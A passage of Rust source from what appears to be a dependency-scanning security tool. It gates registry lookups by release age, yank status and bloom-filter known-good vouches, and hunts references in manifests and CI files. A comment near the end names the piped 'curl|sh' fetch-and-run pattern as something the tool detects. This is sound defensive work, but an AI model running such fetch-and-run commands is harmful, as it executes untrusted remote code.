            Self::Removed => "version removed from registry",
            Self::AgedOut => "older than --max-dep-age",
            Self::KnownGood => "known-good (bloom, resolved version)",
        }
    }
}

/// Whether a dependency version has been withdrawn from its registry — an npm
/// unpublish (`version_removed`), a pypi/crates yank (recorded as a
/// `deprecated` reason, which never sets `version_removed`), or an npm security
/// takedown (`security_hold`). A withdrawn version's known-good vouch is suspect
/// — it is often *removed because* it was found malicious — so it is re-scanned.
///
/// Withdrawn is not the same as unfetchable, which is what makes re-scanning
/// worth doing. Only an npm unpublish actually removes the bytes; a yank on
/// crates.io or PyPI leaves the artifact downloadable forever (it only stops
/// *new* resolution, so pinned builds keep working), and npm's security hold
/// replaces the release with a placeholder that is served like any other. Those
/// are the cases worth a second look, and their bytes are still there to look at.
///
/// The `version_removed` arm is consequently unreachable from [`age_gate`],
/// which tests it first and settles those as [`SkipReason::Removed`] before
/// consulting [`must_rescan`] at all. It is kept because this predicate is about
/// withdrawal, not about that one caller's ordering.
fn dep_pulled(reg: &Registry) -> bool {
    reg.version_removed == Some(true)
        || reg.security_hold == Some(true)
        || reg.deprecated.as_deref().is_some_and(|d| {
            let d = d.to_ascii_lowercase();
            d.contains("yank") || d.contains("withdrawn") || d.contains("unpublish")
        })
}

/// Number of seconds in the freshness window: a version published this recently
/// is re-scanned rather than trusted on a known-good vouch.
///
/// A published registry version is immutable — npm, crates.io and PyPI all
/// refuse to re-publish `name@version` with different bytes — so a vouch for a
/// pinned coordinate cannot go stale the way a mutable one can, and age is
/// otherwise no reason to distrust it. What this window buys is narrower: cover
/// for the hours right after a release, where a compromise is freshest and
/// least-vetted, and insurance against the bloom itself being wrong about a
/// brand-new package. Hours, not days, is the right size for that.
pub(crate) const FRESH_WINDOW_SECS: u64 = 4 * 3_600;

/// Whether this version was published inside [`FRESH_WINDOW_SECS`].
fn freshly_published(reg: &Registry, now: u64) -> bool {
    reg.age_secs(now)
        .is_some_and(|age| age <= FRESH_WINDOW_SECS)
}

/// A known-good dependency is normally skipped; re-scan it anyway when its trust
/// may be stale — the version was pulled/yanked, or published very recently.
pub(crate) fn must_rescan(reg: &Registry, now: u64) -> bool {
    dep_pulled(reg) || freshly_published(reg, now)
}

/// The publish timestamp a Go pseudo-version carries in its own version string,
/// as seconds since the epoch.
///
/// The module proxy mints a pseudo-version for a commit with no semver tag:
/// `v0.0.0-20260528132821-f66b8cdce5b3`, or `v1.2.3-0.20260528132821-abc…` when
/// it follows a release. The middle field is a UTC `yyyymmddhhmmss` stamp of the
/// commit — the same date the registry would report, already in hand. Parsing it
/// locally lets the age gate reject an old module with no round-trip at all; a
/// `go.sum` alone can declare hundreds.
///
/// `None` for a tagged version (`v1.9.0`), a malformed stamp, or an
/// out-of-range field — anything not confidently datable falls through to the
/// registry lookup rather than being guessed at, so this can only ever save
/// work, never invent an age.
fn go_pseudo_version_published(purl: &str) -> Option<u64> {
    let coordinate = Coordinate::of(purl).filter(|c| c.typ == "golang")?;
    // Split on both separators: the bare form joins the stamp with dashes
    // (`v0.0.0-<stamp>-<hash>`), while the post-release form reaches it through
    // a dotted pre-release segment (`v1.2.3-0.<stamp>-<hash>`). The version's own
    // numeric fields are far too short to be mistaken for a 14-digit stamp, and
    // a Go commit hash is 12 hex chars.
    let stamp = coordinate
        .version?
        .split(['-', '.'])
        .find(|f| f.len() == 14 && f.bytes().all(|b| b.is_ascii_digit()))?;
    let n = |a: usize, b: usize| stamp.get(a..b)?.parse::<u32>().ok();
    utc_epoch(
        n(0, 4)?,
        n(4, 6)?,
        n(6, 8)?,
        n(8, 10)?,
        n(10, 12)?,
        n(12, 14)?,
    )
}

/// The reference's coordinate with the registry's resolved version attached, or
/// `None` when it isn't a PURL or nothing resolved.
///
/// A manifest declares a *range* (`"axios": "^1.6.0"`), so an npm reference's
/// locator usually carries no version at all — and the bloom is keyed on exact
/// `name@version`, so probing the declared form can only ever miss. Measured on a
/// 55-package corpus: 22 of 25 npm references arrived version-less, i.e. the
/// known-good check was structurally dead for npm. Lockfile ecosystems (cargo,
/// golang) pin exact versions and are unaffected.
///
/// The version is appended to the declared locator rather than rebuilt from
/// `reg.ecosystem`, so the PURL type and namespace stay exactly as the reference
/// resolver produced them.
fn resolved_purl(r: &Reference, reg: &Registry) -> Option<String> {
    let RefLocator::Purl(purl) = &r.locator else {
        return None;
    };
    if reg.version.is_empty() {
        return None;
    }
    if Coordinate::of(purl)?.version.is_some() {
        return Some(purl.clone());
    }
    Some(format!("{purl}@{}", reg.version))
}

/// Whether the *resolved* coordinate is vouched known-good. The post-lookup
/// counterpart to [`bloom_known_good_purl`]: it costs nothing extra (the record
/// is already in hand) and catches the range-declared references the pre-lookup
/// probe cannot. Pairs with [`must_rescan`], which the pre-lookup path has to
/// forgo — here the record exists, so a yanked version is still caught.
fn bloom_known_good_resolved(r: &Reference, reg: &Registry) -> bool {
    resolved_purl(r, reg).is_some_and(|purl| {
        crate::bloom_repo::global().is_some_and(|lk| lk.decide_purl(&purl).may_skip())
    })
}

/// Whether a reference is a known-good package coordinate per the loaded bloom
/// filters. Purl-keyed, so it vouches for the coordinate, not the exact bytes.
///
/// Used by [`age_gate`] as a pre-lookup filter: a vouched coordinate skips both
/// the registry round-trip and the artifact fetch. That means the yank check
/// [`must_rescan`] performs is *not* applied there — it needs a registry record
/// this path deliberately never fetches. The trade is intentional: a vouched
/// coordinate is not worth a network round-trip to re-confirm.
fn bloom_known_good_purl(r: &Reference) -> bool {
    let RefLocator::Purl(purl) = &r.locator else {
        return false;
    };
    crate::bloom_repo::global().is_some_and(|lk| lk.decide_purl(purl).may_skip())
}

/// Skip predicate for fetched-dependency analysis: skip any member cleave is
/// about to analyze whose sha256 the installed bloom filters vouch known-good —
/// the same short-circuit the top-level scan applies, so a prebuilt native tool
/// shipped inside a dependency isn't needlessly re-disassembled. Unlike the
/// top-level predicate it applies no local-file freshness guard: a dependency's
/// bytes are content-addressed (fetched by locator, sha-verified) and extracted
/// to fresh temp files, so an mtime check would spuriously force analysis every
/// run. Known-bad, conflicted, and unknown members are always analyzed. `None`
/// when no bloom set is installed, leaving analysis unfiltered.
fn dep_skip_predicate() -> Option<cleave::SkipPredicate> {
    let lookup = crate::bloom_repo::global()?;
    Some(cleave::SkipPredicate(std::sync::Arc::new(
        move |sha_hex: &str, _path: &Path| {
            burton::parse_sha256_hex(sha_hex)
                .is_some_and(|d| lookup.may_skip(&burton::Artifact::sha256(&d)))
        },
    )))
}

/// A dependency whose registry record resolved. The record is materialized
/// whether or not its bytes are fetched; `skip` says why they were not.
struct Gated {
    reference: Reference,
    record: Registry,
    /// The provider documents a fresh lookup read. `None` after a memo hit,
    /// whose documents stay in fletch's blob cache until a kept record needs
    /// them.
    sources: Option<Vec<RecordedSource>>,
    skip: Option<SkipReason>,
}

/// One registry lookup's result, as [`Gated`] carries it.
struct Lookup {
    record: Registry,
    sources: Option<Vec<RecordedSource>>,
}

/// Split a locator into `(package key, version)` when it is a PURL carrying an
/// explicit version. The key keeps npm scoped names whole
/// (`pkg:npm/@scope/name@1.2.3` → `pkg:npm/@scope/name`). A candidate version
/// must start with an ASCII digit — git refs, tags, and a scoped name with no
/// version at all (`pkg:npm/@scope/name`) are not versions and exempt the
/// reference from the newest-version gate.
fn versioned_purl(locator: &str) -> Option<(&str, &str)> {
    let coordinate = Coordinate::of(locator)?;
    let version = coordinate
        .version
        .filter(|v| v.starts_with(|c: char| c.is_ascii_digit()))?;
    Some((coordinate.key, version))
}

/// True when `r` is a bare (versionless) PURL whose coordinate is pinned by a
/// version-carrying sibling elsewhere in the tree (`pinned` holds those
/// coordinates). A manifest range reaches us version-stripped — `pkg:npm/foo` —
/// and would resolve to `dist-tags/latest`; when a lockfile pins the same
/// coordinate (`pkg:npm/foo@1.2.3`), that pin is ground truth and the bare
/// sibling is redundant, so it is dropped. A versionless PURL's whole string is
/// its coordinate, so an exact set membership is the supersede; a git/tag pin
/// (`pkg:npm/foo@dev`) keeps its `@ref`, is not versionless, and never matches.
fn superseded_by_pin(r: &Reference, pinned: &HashSet<String>) -> bool {
    let RefLocator::Purl(p) = &r.locator else {
        return false;
    };
    // Constrained Cargo/Python manifests are reconciled with their own lock;
    // an unrelated package's pin cannot satisfy their requirement.
    !p.contains("version_requirement=")
        && versioned_purl(p).is_none()
        && pinned.contains(p.as_str())
}

fn dependency_execution_priority(reference: &Reference) -> u8 {
    if reference
        .context
        .as_ref()
        .is_some_and(|c| c.has_install_script || c.scope == filefacts::DependencyScope::Build)
        || reference.source.starts_with("npm.scripts.")
        || reference.source.contains("build-dependencies")
        || reference.source.contains("build-system.requires")
        || reference.source.contains("proc-macro")
    {
        0
    } else if reference.kind == RefKind::Command {
        1
    } else if reference
        .context
        .as_ref()
        .is_some_and(|c| c.scope == filefacts::DependencyScope::Development)
        || reference.source.contains("dev-dependencies")
    {
        3
    } else {
        2
    }
}

/// Lenient, numeric-aware version ordering: the string splits into components
/// at `.`, `-`, `_`, and `+`; each component compares by its leading integer
/// first (`3` > `rc1`? — a fully numeric component outranks a text-led one, so
/// `1.2.3` > `1.2.rc1`), then by remaining text. More components with an equal
/// prefix is newer (`1.2.1` > `1.2`). This orders real registry releases of
/// one package — semver, pep440-ish, and date-like schemes — without
/// validating any of them.
fn lenient_version_cmp(a: &str, b: &str) -> std::cmp::Ordering {
    use std::cmp::Ordering;
    fn component_cmp(x: &str, y: &str) -> Ordering {
        let digits = |s: &str| s.chars().take_while(char::is_ascii_digit).count();
        let (nx, rx) = x.split_at(digits(x));
        let (ny, ry) = y.split_at(digits(y));
        match (nx.is_empty(), ny.is_empty()) {
            (false, true) => return Ordering::Greater,
            (true, false) => return Ordering::Less,
            (true, true) => return x.cmp(y),
            (false, false) => {}
        }
        let num = match (nx.parse::<u64>(), ny.parse::<u64>()) {
            (Ok(vx), Ok(vy)) => vx.cmp(&vy),
            // A digit run longer than u64 still orders consistently as text.
            _ => nx.cmp(ny),
        };
        num.then_with(|| rx.cmp(ry))
    }
    let (ca, cb): (Vec<&str>, Vec<&str>) = (
        a.split(['.', '-', '_', '+']).collect(),
        b.split(['.', '-', '_', '+']).collect(),
    );
    for (x, y) in ca.iter().zip(cb.iter()) {
        let ord = component_cmp(x, y);
        if ord != std::cmp::Ordering::Equal {
            return ord;
        }
    }
    ca.len().cmp(&cb.len())
}

/// Look up each declared dependency's registry metadata, stamp its relative
/// age, and decide which to fetch. A dependency older than the policy's age
/// ceiling — or one whose coordinate is known-good and whose trust isn't stale —
/// is dropped before the expensive fetch+scan of its bytes; one whose age is
/// unknown or under the ceiling is kept — fail open, so a registry hiccup or an
/// unsupported ecosystem never silently hides a dependency from the scan. URLs
/// and command-mentioned packages aren't gated: their risk isn't a function of a
/// registry release date. Returns the refs to fetch plus, for *every* dependency
/// that resolved a registry record, its [`Gated`] — the record is materialized
/// whether or not its bytes are fetched, and the reason drives the skip report.
fn age_gate(
    selected: Vec<Reference>,
    policy: &FetchPolicy,
    res: &Resources,
    now: u64,
) -> (Vec<Reference>, Vec<Gated>) {
    // Never age-gate a manifest range using today's unrelated latest release.
    // Unresolvable references bypass registry gating and retain the normal
    // unresolved fetch outcome, making incomplete coverage visible. Resolution
    // may ask a registry, so the references resolve concurrently, in order.
    let resolved: Vec<(Reference, Option<Reference>)> = {
        use rayon::prelude::*;
        selected
            .into_par_iter()
            .map(|r| {
                let exact = fletch::fetch::resolve_declared_reference(&r, &res.net, &res.cache);
                (r, exact)
            })
            .collect()
    };
    let mut unresolved = Vec::new();
    let mut selected = Vec::with_capacity(resolved.len());
    for (r, exact) in resolved {
        match exact {
            Some(exact) => selected.push(exact),
            None => unresolved.push(r),
        }
    }
    // `None` ceiling (the `--max-dep-age 0` opt-out) gates nothing, but registry
    // records are still looked up and materialized.
    let max_age =
        (policy.max_dep_age_days > 0).then(|| u64::from(policy.max_dep_age_days) * 86_400);
    // Vouched coordinates never reach the network. The bloom probe is a local
    // filter test on the PURL, so asking it *before* `lookup_registries` turns a
    // known-good dependency from "one registry round-trip, then skip" into "no
    // I/O at all" — the single largest saving available on a lockfile-heavy scan,
    // where a `Cargo.lock` alone can declare 700 coordinates.
    //
    // Two things are given up, deliberately. The artifact is not re-scanned even
    // if the version was later yanked (`must_rescan` needs the record we no
    // longer fetch) — an accepted trade: a known-good coordinate is not worth
    // re-fetching. And no `*.registry.json` node is materialized for it, so its
    // registry metadata contributes no findings. Both apply *only* to
    // bloom-vouched coordinates; everything else keeps the full path below.
    let (selected, vouched): (Vec<Reference>, Vec<Reference>) = selected
        .into_iter()
        .partition(|r| !bloom_known_good_purl(r));
    // Second local filter: a Go pseudo-version states its own commit date, so an
    // old module can be aged out without asking the proxy. Only applies when a
    // ceiling is set — with `--fetch-max-age 0` (worker mode) nothing ages out,
    // so there is nothing to short-circuit.
    let (selected, self_dated): (Vec<Reference>, Vec<Reference>) =
        selected.into_iter().partition(|r| {
            let RefLocator::Purl(purl) = &r.locator else {
                return true;
            };
            !max_age.is_some_and(|max| {
                go_pseudo_version_published(purl)
                    .is_some_and(|published| now.saturating_sub(published) >= max)
            })
        });
    for r in &self_dated {
        tracing::debug!(
            package = %locator(r),
            "go pseudo-version dates itself past --max-dep-age; registry lookup skipped"
        );
    }
    for r in &vouched {
        crate::bloom_repo::record(crate::bloom_repo::Decision::Skip, false);
        tracing::debug!(
            package = %locator(r),
            "known-good coordinate (bloom); registry lookup and fetch both skipped"
        );
    }
    // The network round-trips run concurrently up front; the gate decision below
    // is then pure, so it stays deterministic in `selected` order.
    let lookups = lookup_registries(&selected, res, now);
    let mut keep = Vec::with_capacity(selected.len());
    let mut registries = Vec::new();
    for (r, lookup) in selected.into_iter().zip(lookups) {
        match lookup {
            // A resolved record: gate on age, but materialize it either way. A
            // version the registry has already removed has no fetchable artifact,
            // so skip the doomed fetch too. In every skip case the materialized
            // record's signals still surface. (Known-good coordinates never get
            // here — they were filtered out above, before the lookup.)
            Some(Lookup { record, sources }) => {
                let skip = if record.version_removed == Some(true) {
                    Some(SkipReason::Removed)
                } else if max_age
                    .is_some_and(|max| record.age_secs(now).is_some_and(|age| age >= max))
                {
                    Some(SkipReason::AgedOut)
                } else if bloom_known_good_resolved(&r, &record) && !must_rescan(&record, now) {
                    Some(SkipReason::KnownGood)
                } else {
                    None
                };
                if skip.is_none() {
                    keep.push(r.clone());
                }
                registries.push(Gated {
                    reference: r,
                    record,
                    sources,
                    skip,
                });
            }
            // A non-dependency, or a dependency whose record didn't resolve —
            // fetch it (fail open).
            None => keep.push(r),
        }
    }
    keep.extend(unresolved);
    (keep, registries)
}

/// Process-wide memo of registry lookups, keyed by locator string. A package
/// named across many scanned files resolves once: the first lookup fills this,
/// and every later file reads the record straight from memory — no repeated disk
/// read, JSON parse, and ecosystem mapping. The *un-aged* record is stored (age
/// is relative to each scan's clock, so [`Registry::with_age`] is applied per
/// read); `None` is memoized too, so an unsupported ecosystem or an unresolved
/// package isn't re-attempted for every file that names it. Lives for the
/// process, fronting the on-disk blob cache.
fn registry_memo() -> &'static RwLock<lru::LruCache<String, Option<Registry>>> {
    static MEMO: OnceLock<RwLock<lru::LruCache<String, Option<Registry>>>> = OnceLock::new();
    MEMO.get_or_init(|| RwLock::new(lru::LruCache::new(REGISTRY_MEMO_CAPACITY)))
}

/// Entries the registry memo keeps. It was an unbounded `HashMap` keyed by
/// raw PURL/URL — one entry per distinct dependency locator a worker ever
/// resolved, forever — which on a days-old fetching worker is hundreds of MB
/// of `Registry` records (a big packument's `release_times` alone is
/// 40-80 KB). Dependency sets cluster in time, so an LRU of a few thousand
/// serves the same hit rate; a miss falls through to fletch's blob cache.
const REGISTRY_MEMO_CAPACITY: std::num::NonZeroUsize = match std::num::NonZeroUsize::new(4096) {
    Some(n) => n,
    None => std::num::NonZeroUsize::MIN,
};

/// Release-cadence window `Registry::with_age` looks back over (48 h).
const RELEASE_CADENCE_WINDOW_SECS: u64 = 172_800;

/// Look up each declared dependency's registry record, returning one slot per
/// input ref in `selected` order. A non-dependency ref, or one whose record
/// can't be resolved, yields `None`.
///
/// Fresh misses use `registry_with_sources` once, so the normalized record and
/// provenance come from one lookup. The process memo deliberately retains only
/// the small record; a memo hit leaves the provider documents in fletch's blob
/// cache, read again only for a record that is kept (see [`Gated::sources`])
/// rather than pinned in a long-lived daemon's heap or re-read for every hit.
fn lookup_registries(selected: &[Reference], res: &Resources, now: u64) -> Vec<Option<Lookup>> {
    let mut found: Vec<Option<Lookup>> = selected.iter().map(|_| None).collect();

    // Split dependency refs into memo hits — served from memory, no disk or
    // network — and misses that still need a lookup.
    let mut misses: Vec<usize> = Vec::new();
    {
        // `peek`, not `get`: a read lock cannot bump LRU order, and a memo
        // hit is cheap enough that recency-on-read is not worth a write lock.
        let memo = registry_memo()
            .read()
            .unwrap_or_else(PoisonError::into_inner);
        for (i, r) in selected.iter().enumerate() {
            if r.kind != RefKind::Dependency {
                continue;
            }
            match memo.peek(locator(r)) {
                // Stored un-aged; stamp the age signals from this scan's clock.
                Some(hit) => {
                    found[i] = hit.clone().map(|record| Lookup {
                        record: record.with_age(now),
                        sources: None,
                    });
                }
                None => misses.push(i),
            }
        }
    }

    // Run the lookups on the existing rayon pool rather than spawning a fresh
    // batch of OS threads.
    //
    // `std::thread::scope` here created `REGISTRY_LOOKUP_CONCURRENCY` threads per
    // batch, and a directory scan reaches this once per scanned root (times each
    // `--fetch-depth` hop). Every spawn and exit takes the address space's
    // `mmap_lock` to map and unmap a stack, and with the whole rayon pool already
    // resident that serializes into `native_queued_spin_lock_slowpath` — measured
    // at 65% of all samples, with the fetch path burning ~1350s of system time
    // against ~13s for the same scan offline. Rayon's workers already exist, so
    // this is the same fan-out with no thread churn.
    //
    // The lookups are also not the I/O-bound work the old fan-out assumed: nearly
    // all are blob-cache hits that parse JSON and map an ecosystem, i.e. CPU. A
    // separate experiment raising the old constant 8 -> 64 made the scan *slower*
    // (40s vs 33s) for exactly that reason.
    let fresh: Vec<(usize, Option<Lookup>)> = {
        use rayon::prelude::*;
        misses
            .par_iter()
            .map(|&i| {
                // The raw, un-aged record (or `None` for an unresolved or
                // unsupported package) — both worth memoizing so the lookup isn't
                // re-attempted for every file that names it.
                let (record, sources) =
                    fletch::registry_with_sources(&selected[i].locator, &res.net, &res.cache);
                let lookup = record.map(|record| Lookup {
                    record,
                    sources: Some(sources),
                });
                (i, lookup)
            })
            .collect()
    };

    let mut writes: Vec<(String, Option<Registry>)> = Vec::with_capacity(fresh.len());
    for (i, lookup) in fresh {
        let key = locator(&selected[i]).to_owned();
        let Some(Lookup { record, sources }) = lookup else {
            writes.push((key, None));
            continue;
        };
        // Keep only the release times `with_age` can still count from any later
        // clock: a release older than the cadence window at memo time can never
        // fall inside it again. Bounds the one unbounded field a memoized record
        // carries.
        let mut memoized = record.clone();
        memoized
            .release_times
            .retain(|&t| now.saturating_sub(t) <= RELEASE_CADENCE_WINDOW_SECS);
        writes.push((key, Some(memoized)));
        found[i] = Some(Lookup {
            record: record.with_age(now),
            sources,
        });
    }
    // One short critical section: nothing but the batch insert runs under the lock.
    {
        let mut memo = registry_memo()
            .write()
            .unwrap_or_else(PoisonError::into_inner);
        for (key, value) in writes {
            memo.put(key, value);
        }
    }
    found
}

/// Serialize a registry record to its `*.registry.json` document and analyze it
/// with cleave, so filefacts parses the `registry.*` facts and the trait engine
/// runs over them. The document is named by the package so detection routes it
/// to `FileType::Registry`. `None` if it can't be serialized or analyzed.
fn registry_node(reg: &Registry, opts: &AnalysisOptions) -> Option<AnalysisReport> {
    let bytes = serde_json::to_vec(reg).ok()?;
    match cleave::analyze_bytes_owned(bytes, &registry_doc_name(reg), opts) {
        Ok(mut sub) => {
            sub.finalize();
            Some(sub)
        }
        Err(e) => {
            tracing::warn!(package = %reg.name, "registry metadata analysis failed: {e:#}");
            None
        }
    }
}

/// The synthetic filename for a registry document: `<name>@<version>.registry
/// .json`, with path-unsafe characters folded to `_` so a scoped or `vendor/pkg`
/// name can't escape into a directory. The `.registry.json` suffix is what
/// filefacts detects.
fn registry_doc_name(reg: &Registry) -> String {
    let stem = if reg.version.is_empty() {
        reg.name.clone()
    } else {
        format!("{}@{}", reg.name, reg.version)
    };
    let base: String = stem
        .chars()
        .map(|c| {
            if c.is_ascii_alphanumeric() || matches!(c, '.' | '-' | '_' | '@') {
                c
            } else {
                '_'
            }
        })
        .collect();
    format!("{base}.registry.json")
}

/// Render one skipped dependency to stderr in the fetch progress block: the
/// package, its age in days, and the strongest reputation signal the registry
/// gave (downloads, else votes/rating). A known-good skip reads green with a ✓
/// (trusted, not re-scanned); a removed version reads muted (no artifact to
/// fetch). Aged-out deps never reach here — they stay at debug.
fn report_skip(r: &Reference, reg: &Registry, now: u64, reason: SkipReason) {
    let age_days = reg.age_secs(now).unwrap_or(0) / 86_400;
    let signal = reg
        .downloads_recent
        .or(reg.downloads_total)
        .map(|d| format!("{d} dl"))
        .or_else(|| reg.rating_count.map(|v| format!("{v} votes")));
    let detail = signal.map_or_else(String::new, |signal| format!("  {}", fg(MUTED, &signal)));
    let (glyph, label, color) = match reason {
        SkipReason::KnownGood => ('\u{2713}', "known-good", GOOD),
        SkipReason::Removed => ('\u{00b7}', "removed", MUTED),
        SkipReason::AgedOut => ('\u{00b7}', "skip", MUTED),
    };
    eprintln!(
        "    {} {}  {}{detail}",
        fg(color, &format!("{glyph} {label:<10}")),
        fg(DETAIL, &format!("{:>10}", format!("{age_days}d old"))),
        locator(r)
    );
}

/// Wall-clock now as Unix seconds, saturating to `0` before the epoch.
pub(crate) fn unix_now() -> u64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map_or(0, |d| d.as_secs())
}

/// Unix seconds for a UTC civil time, or `None` for a field out of range or a
/// time before 1970.
pub(crate) fn utc_epoch(
    year: u32,
    month: u32,
    day: u32,
    hour: u32,
    minute: u32,
    second: u32,
) -> Option<u64> {
    if hour > 23 || minute > 59 || second > 60 {
        return None;
    }
    let days = crate::civil::to_days(i64::from(year), month, day)?;
    u64::try_from(
        days * 86_400 + i64::from(hour) * 3_600 + i64::from(minute) * 60 + i64::from(second),
    )
    .ok()
}

/// Tally the run's fetches into a one-line summary mirroring the progress bar's
/// completion line: how many came live off the network vs. served from cache,
/// how many failed, and the total bytes pulled. Used by the live tree, which
/// prints it beneath the settled dependency rows.
fn summary_line(records: &[FetchRecord]) -> String {
    let mut live = 0u32;
    let mut cached = 0u32;
    let mut failed = 0u32;
    let mut bytes = 0u64;
    let mut pending = 0u32;
    let mut local = 0u32;
    let mut dev = 0u32;
    let mut incomplete = 0u32;
    for rec in records {
        bytes += rec.size.unwrap_or(0);
        let note = rec.coverage_note.as_deref().unwrap_or_default();
        if matches!(
            rec.outcome,
            Outcome::BudgetExceeded | Outcome::Unresolved(_)
        ) || note.starts_with("pending:")
        {
            pending += 1;
        }
        if note.starts_with("supplied code already analyzed:") {
            local += 1;
        }
        if note.starts_with("development-only") {
            dev += 1;
        }
        if matches!(note, "analysis incomplete" | "analysis unavailable") {
            incomplete += 1;
        }
        match &rec.outcome {
            Outcome::Ok | Outcome::PinMismatch | Outcome::UnverifiablePin if rec.is_cached() => {
                cached += 1;
            }
            Outcome::Ok | Outcome::PinMismatch | Outcome::UnverifiablePin => live += 1,
            Outcome::Failed(_) => failed += 1,
            Outcome::BudgetExceeded | Outcome::Unresolved(_) | Outcome::Skipped => {}
        }
    }
    // Only the counts that actually happened, so a warm run reads
    // `2 cached  ·  160.5 MB` instead of padding a `0 live` nobody asked about.
    // Bytes always show — the total pulled is the headline the tally exists for.
    let mut parts = Vec::new();
    if live > 0 {
        parts.push(format!("{live} live"));
    }
    if cached > 0 {
        parts.push(format!("{cached} cached"));
    }
    if failed > 0 {
        parts.push(format!("{failed} failed"));
    }
    for (count, label) in [
        (pending, "pending"),
        (local, "supplied locally"),
        (dev, "development excluded"),
        (incomplete, "analysis incomplete"),
    ] {
        if count > 0 {
            parts.push(format!("{count} {label}"));
        }
    }
    parts.push(human_bytes(bytes));
    format!(
        "  {}  {}",
        if failed + pending + incomplete > 0 {
            fg(Rgb(220, 160, 80), "!")
        } else {
            fg(Rgb(80, 220, 80), "\u{2713}")
        },
        fg(LABEL, &parts.join("  \u{b7}  "))
    )
}

/// Bytes in a compact human-readable form (`45.2 KB`), for the fetch log.
fn human_bytes(n: u64) -> String {
    const UNITS: [&str; 5] = ["B", "KB", "MB", "GB", "TB"];
    let mut value = n as f64;
    let mut unit = 0;
    while value >= 1024.0 && unit < UNITS.len() - 1 {
        value /= 1024.0;
        unit += 1;
    }
    if unit == 0 {
        format!("{n} B")
    } else {
        format!("{value:.1} {}", UNITS[unit])
    }
}

/// A file whose references execute only in CI, never in an installed artifact
/// — a GitHub Actions workflow or composite `action.yml`. Its `uses:` actions
/// and `run:` fetches are third-party code, but they run on the CI runner, so a
/// routine dependency fetch skips them; `--fetch=all`/`--fetch=ci` opts in.
fn is_ci_context(file: &cleave::types::FileAnalysis) -> bool {
    file.file_type == filefacts::FileType::GithubActions.label()
}

/// Whether [`collect_references`] follows references that only ever execute in
/// CI. Auditing an artifact and auditing the pipeline that built it are
/// different questions, and the caller always knows which one it is asking.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum CiRefs {
    Skip,
    Include,
}

/// References to fetch, grouped by the sha256 of the file that declared them.
fn collect_references(
    report: &AnalysisReport,
    root_path: &Path,
    ci: CiRefs,
) -> Vec<(String, Vec<Reference>)> {
    // Members under a vendored node_modules tree have already been analyzed.
    // Fetching each of their `require("x")` targets again grafted a newer
    // registry release onto the report and repeated work over bytes that came
    // with the sample. Keep hunting absent imports, but resolve local packages
    // first from the package.json members already present in this report.
    let local_npm = LocalNpmPackages::from_report(report);
    // Built once: a lockfile is looked up by path, and a declaring file's
    // nodes by sha, once per file — a scan apiece would be quadratic in the
    // size of an archive.
    let mut by_path: HashMap<&str, &cleave::types::FileAnalysis> = HashMap::new();
    let mut by_sha: HashMap<&str, Vec<&cleave::types::FileAnalysis>> = HashMap::new();
    for file in &report.files {
        by_path.entry(file.path.as_str()).or_insert(file);
        by_sha.entry(file.sha256.as_str()).or_default().push(file);
    }
    let mut local_imports_skipped = 0usize;
    let mut vendored_imports_skipped = 0usize;
    let mut groups: Vec<(String, Vec<Reference>)> = Vec::new();
    for file in &report.files {
        // A GitHub Actions workflow is a CI-only context: its `uses:` actions
        // execute in CI, never in an installed artifact. Skip the whole member
        // unless CI auditing was requested (`--fetch=all`, `--fetch=ci`). The
        // root of a single-file workflow scan is a member here like any other,
        // so this one gate covers it too.
        if ci == CiRefs::Skip && is_ci_context(file) {
            continue;
        }
        let Some(view) = &file.filefacts else {
            continue;
        };
        // Declared references plus the value-driven hunt (npm lifecycle hooks),
        // both from facts the report already carries — so every archive member,
        // not just the root, contributes its references without re-extraction.
        let mut refs = find::references_from_facts(&view.values, &view.references);
        // A co-located lockfile is authoritative; do not borrow pins from
        // other bundled packages. Workspace-only locks remain explicit range
        // resolution until workspace ownership can be established.
        if let Some((directory, _)) = file.path.rsplit_once('/') {
            let lock_name = if file.path.ends_with("/Cargo.toml") {
                Some("Cargo.lock")
            } else if file.path.ends_with("/pyproject.toml") {
                Some("poetry.lock")
            } else {
                None
            };
            if let Some(lock_name) = lock_name {
                let lock_path = format!("{directory}/{lock_name}");
                if let Some(lock) = by_path
                    .get(lock_path.as_str())
                    .and_then(|f| f.filefacts.as_ref())
                {
                    refs = refs
                        .iter()
                        .map(|r| fletch::fetch::prefer_lock_pin(r, &lock.references))
                        .collect();
                }
            }
        }
        // Module-load calls from the member's retained AST symbols — the
        // facts-only import vector, so `require("undeclared-pkg")` inside an
        // archive member is hunted without re-extracting its discarded bytes.
        refs.extend(
            find::import_calls(&file.file_type, &view.symbols)
                .into_iter()
                .filter(|reference| {
                    let Some(package) = npm_import_name(reference) else {
                        return true;
                    };
                    // `node_modules` is the installed dependency graph captured
                    // in the artifact. If one of those files imports a package
                    // absent from that graph, Node fails or takes the module's
                    // own fallback path; it does not download today's registry
                    // release. Declared package.json dependencies are collected
                    // separately, so suppress only inferred import-call hunts.
                    if is_vendored_node_module(&file.path) {
                        vendored_imports_skipped += 1;
                        tracing::debug!(
                            source = %file.path,
                            package,
                            "import originates in vendored node_modules; external fetch avoided"
                        );
                        return false;
                    }
                    let present = local_npm.resolves(&file.path, &package);
                    if present {
                        local_imports_skipped += 1;
                        tracing::debug!(
                            source = %file.path,
                            package,
                            "import resolves to vendored node_modules; skipping external fetch"
                        );
                    }
                    !present
                }),
        );
        if refs.is_empty() {
            continue;
        }
        if is_ci_context(file) {
            for reference in &mut refs {
                let context = reference
                    .context
                    .get_or_insert(filefacts::DependencyContext {
                        scope: filefacts::DependencyScope::Ci,
                        optional: false,
                        has_install_script: false,
                        installed_path: None,
                    });
                context.scope = filefacts::DependencyScope::Ci;
            }
        }
        groups.push((file.sha256.clone(), refs));
    }
    if local_imports_skipped > 0 {
        tracing::info!(
            local_imports_skipped,
            "vendored imports already present in report; external refetch avoided"
        );
    }
    if vendored_imports_skipped > 0 {
        tracing::info!(
            vendored_imports_skipped,
            "imports from captured node_modules kept inside artifact boundary"
        );
    }

    // The root sample's imperative hunt (curl|sh, `npm install` in a RUN, a URL
    // in a shell variable) needs its raw text, which the report doesn't carry —
    // read it back from disk for small text-ish roots and merge, deduping
    // against the declared references already collected for the root. The hunt
    // reads bytes the loop above never opened, so it repeats that loop's CI
    // gate — a workflow's raw text re-discovers the `uses:` actions just
    // skipped.
    if let Some(root) = report.files.first()
        && (ci == CiRefs::Include || !is_ci_context(root))
        && root.size <= ROOT_HUNT_MAX_BYTES
        && let Ok(bytes) = std::fs::read(root_path)
    {
        let name = root_path
            .file_name()
